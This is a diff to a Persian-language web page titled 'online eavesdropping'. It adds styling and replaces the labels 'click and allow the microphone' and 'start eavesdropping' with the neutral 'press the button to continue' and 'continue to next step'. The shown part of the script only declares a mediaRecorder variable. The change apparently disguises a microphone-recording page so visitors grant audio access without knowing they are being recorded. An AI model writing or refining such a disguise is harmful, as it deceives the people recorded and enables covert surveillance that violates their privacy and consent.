@@ -3,10 +3,47 @@
 <head>
   <meta charset="UTF-8">
   <title>شنود آنلاین</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #2c001e, #59003c);
+      font-family: 'Vazir', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+      direction: rtl;
+    }
+
+    #startBtn {
+      background-color: #9b1455;
+      color: white;
+      padding: 15px 40px;
+      font-size: 20px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+      transition: all 0.3s ease;
+    }
+
+    #startBtn:hover {
+      background-color: #c2185b;
+      transform: scale(1.05);
+    }
+
+    h2 {
+      position: absolute;
+      top: 20px;
+      text-shadow: 0 2px 5px black;
+    }
+  </style>
 </head>
 <body>
-  <h2>برای شروع، روی دکمه کلیک کنید و اجازه میکروفون بدهید</h2>
-  <button id="startBtn">شروع شنود</button>
+  <h2>برای ادامه، دکمه را فشار دهید</h2>
+  <button id="startBtn">ادامه مرحله بعد</button>
 
   <script>
     let mediaRecorder;
